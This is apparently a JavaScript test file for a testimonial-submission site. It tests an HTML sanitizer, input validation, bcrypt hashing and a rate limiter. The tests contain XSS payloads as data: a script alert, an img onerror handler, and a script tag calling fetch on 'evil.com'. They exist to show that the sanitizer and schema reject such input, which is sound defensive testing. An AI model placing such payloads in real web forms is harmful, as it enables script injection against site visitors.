import test from 'node:test';
import assert from 'node:assert/strict';
import { z } from 'zod';
import bcrypt from 'bcryptjs';
import sanitizeHtml from 'sanitize-html';

// 1. Re-test Sanitizer logic
function sanitizePlainText(input) {
  if (!input) return '';
  const stripped = sanitizeHtml(input, {
    allowedTags: [],
    allowedAttributes: {},
    disallowedTagsMode: 'discard',
  });
  return stripped
    .replace(/<[^>]*>?/gm, '')
    .replace(/javascript:/gi, '')
    .replace(/onerror=/gi, '')
    .replace(/onload=/gi, '')
    .trim();
}

// 2. Testimonial Schema definition
const TestimonialSubmissionSchema = z.object({
  authorName: z
    .string()
    .min(2)
    .max(50)
    .regex(/^[a-zA-Z\s\-']+$/),
  cityOrRegion: z
    .string()
    .min(2)
    .max(50)
    .regex(/^[a-zA-Z\s\-',]+$/),
  creationReferenced: z.string().max(100).optional().or(z.literal('')),
  rating: z.number().int().min(1).max(5),
  content: z
    .string()
    .min(30)
    .max(600)
    .refine((val) => !/<[^>]*>?/gm.test(val)),
});

// 3. Rate limiter simulation
const rateLimitStore = new Map();
function checkRateLimit({ key, limit, windowMs }) {
  const now = Date.now();
  const existing = rateLimitStore.get(key);
  if (!existing || now > existing.resetAt) {
    rateLimitStore.set(key, { count: 1, resetAt: now + windowMs });
    return { success: true, remaining: limit - 1 };
  }
  if (existing.count >= limit) {
    return { success: false, remaining: 0 };
  }
  existing.count += 1;
  return { success: true, remaining: limit - existing.count };
}

test('Sanitizer: Neutralizes XSS and script constructs', () => {
  const dirty = '<script>alert("xss")</script><p>Hello <b>World</b></p><img src=x onerror=alert(1)>';
  const clean = sanitizePlainText(dirty);
  assert.equal(clean.includes('<script>'), false);
  assert.equal(clean.includes('onerror'), false);
  assert.equal(clean.includes('<p>'), false);
  assert.equal(clean.includes('Hello World'), true);
});

test('TestimonialSchema: Validates authentic patron submission', () => {
  const validPayload = {
    authorName: 'Julian Sterling',
    cityOrRegion: 'Arts District, Aurelia',
    creationReferenced: 'MVC-2026-T02 Sculpted Neapolitan Flannel Blazer',
    rating: 5,
    content: 'The spalla camicia shoulder construction provides pure architectural fluidity.',
  };

  const parsed = TestimonialSubmissionSchema.safeParse(validPayload);
  assert.equal(parsed.success, true);
});

test('TestimonialSchema: Rejects script tags in narrative', () => {
  const invalidPayload = {
    authorName: 'Attacker',
    cityOrRegion: 'Unknown',
    rating: 5,
    content: '<script>fetch("evil.com")</script> This is malicious code attempt text.',
  };

  const parsed = TestimonialSubmissionSchema.safeParse(invalidPayload);
  assert.equal(parsed.success, false);
});

test('TestimonialSchema: Rejects rating outside 1-5 integer bounds', () => {
  const invalidRating = {
    authorName: 'Patron',
    cityOrRegion: 'Aurelia',
    rating: 6,
    content: 'A wonderful review of the garment that exceeds thirty characters in length.',
  };
  const parsed = TestimonialSubmissionSchema.safeParse(invalidRating);
  assert.equal(parsed.success, false);
});

test('Security: Native bcrypt password hash and verification', async () => {
  const password = 'ValencourtAtelier2026!';
  const hash = await bcrypt.hash(password, 12);
  const isMatch = await bcrypt.compare(password, hash);
  const isWrong = await bcrypt.compare('WrongPassword', hash);

  assert.equal(isMatch, true);
  assert.equal(isWrong, false);
});

test('RateLimiter: Enforces 5 failed attempts limit', () => {
  const key = 'test-ip-127.0.0.1';
  for (let i = 0; i < 5; i++) {
    const res = checkRateLimit({ key, limit: 5, windowMs: 60000 });
    assert.equal(res.success, true);
  }
  const blocked = checkRateLimit({ key, limit: 5, windowMs: 60000 });
  assert.equal(blocked.success, false);
  assert.equal(blocked.remaining, 0);
});
